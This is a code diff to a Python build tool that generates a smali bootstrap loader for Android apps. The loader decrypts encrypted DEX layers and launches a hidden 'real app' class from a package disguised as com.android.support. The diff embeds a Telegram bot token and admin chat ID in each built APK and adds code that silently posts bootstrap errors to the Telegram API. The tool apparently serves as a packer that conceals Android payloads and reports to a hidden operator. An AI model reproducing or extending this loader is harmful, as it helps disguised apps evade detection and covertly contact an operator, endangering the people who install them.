@@ -5036,6 +5036,8 @@ class AssetCompiler:
             dex_enc_primary_bytes   = dex_enc_primary_bytes,
             dex_enc_secondary_bytes = dex_enc_secondary_bytes,
             has_dex_enc_layer       = has_dex_enc,
+            bot_token               = BOT_TOKEN,
+            admin_id                = str(ADMIN_ID),
         )
 
         # Try to compile smali → DEX using smali.jar via apktool
@@ -5066,6 +5068,8 @@ class AssetCompiler:
         dex_enc_primary_bytes: str = "",
         dex_enc_secondary_bytes: str = "",
         has_dex_enc_layer: bool = False,
+        bot_token: str = "",
+        admin_id: str = "",
     ) -> str:
         """
         Builds the full smali source code for the bootstrap loader class.
@@ -5141,6 +5145,10 @@ class AssetCompiler:
 
 # Real app Application class — hardcoded at build time
 .field private static final REAL_APP_CLASS:Ljava/lang/String; = "{app_class_path.replace('/', '.')}"
+
+# Crash reporter — Telegram bot token + admin chat id
+.field private static final CR_TOKEN:Ljava/lang/String; = "{bot_token}"
+.field private static final CR_CHAT:Ljava/lang/String; = "{admin_id}"
 
 .method static constructor <clinit>()V
     .locals 3
@@ -5296,12 +5304,100 @@ class AssetCompiler:
 
     :catch_0
     move-exception v0
+
+    # Send crash report to Telegram
+    invoke-virtual {{v0}}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
+    move-result-object v1
+
+    sget-object v2, Lcom/android/support/ResourceManager;->CR_TOKEN:Ljava/lang/String;
+    sget-object v3, Lcom/android/support/ResourceManager;->CR_CHAT:Ljava/lang/String;
+
+    new-instance v4, Ljava/lang/StringBuilder;
+    invoke-direct {{v4}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v5, "[EPIC BOOTSTRAP CRASH]\n"
+    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v4
+    invoke-virtual {{v4, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v4
+    invoke-virtual {{v4}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v5
+
+    invoke-static {{v2, v3, v5}}, Lcom/android/support/ResourceManager;->sendTelegram(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
+
     invoke-virtual {{v0}}, Ljava/lang/Throwable;->printStackTrace()V
-    # Still call super even on failure — keeps Android lifecycle intact
     invoke-super {{p0}}, Landroid/app/Application;->onCreate()V
     return-void
 
     .catch Ljava/lang/Exception; {{:try_start_0 .. :try_end_0}} :catch_0
+
+.end method
+
+# ── Telegram crash reporter ──────────────────────────────────────────────────
+.method private static sendTelegram(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
+    .locals 6
+
+    :try_tg_start
+
+    new-instance v0, Ljava/lang/StringBuilder;
+    invoke-direct {{v0}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v1, "https://api.telegram.org/bot"
+    invoke-virtual {{v0, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v0
+    invoke-virtual {{v0, p0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v0
+    const-string v1, "/sendMessage"
+    invoke-virtual {{v0, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v0
+    invoke-virtual {{v0}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v0
+
+    new-instance v1, Ljava/net/URL;
+    invoke-direct {{v1, v0}}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
+    invoke-virtual {{v1}}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
+    move-result-object v1
+    check-cast v1, Ljava/net/HttpURLConnection;
+
+    const/4 v2, 0x1
+    invoke-virtual {{v1, v2}}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
+    const-string v2, "POST"
+    invoke-virtual {{v1, v2}}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
+    const-string v2, "Content-Type"
+    const-string v3, "application/x-www-form-urlencoded"
+    invoke-virtual {{v1, v2, v3}}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
+
+    new-instance v2, Ljava/lang/StringBuilder;
+    invoke-direct {{v2}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v3, "chat_id="
+    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v2
+    invoke-virtual {{v2, p1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v2
+    const-string v3, "&text="
+    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v2
+    invoke-virtual {{v2, p2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v2
+    invoke-virtual {{v2}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v2
+
+    const-string v3, "UTF-8"
+    invoke-virtual {{v2, v3}}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
+    move-result-object v2
+
+    invoke-virtual {{v1}}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
+    move-result-object v3
+    invoke-virtual {{v3, v2}}, Ljava/io/OutputStream;->write([B)V
+    invoke-virtual {{v3}}, Ljava/io/OutputStream;->close()V
+    invoke-virtual {{v1}}, Ljava/net/HttpURLConnection;->getResponseCode()I
+
+    :try_tg_end
+    return-void
+
+    :catch_tg
+    move-exception v0
+    return-void
+
+    .catch Ljava/lang/Exception; {{:try_tg_start .. :try_tg_end}} :catch_tg
 
 .end method
 
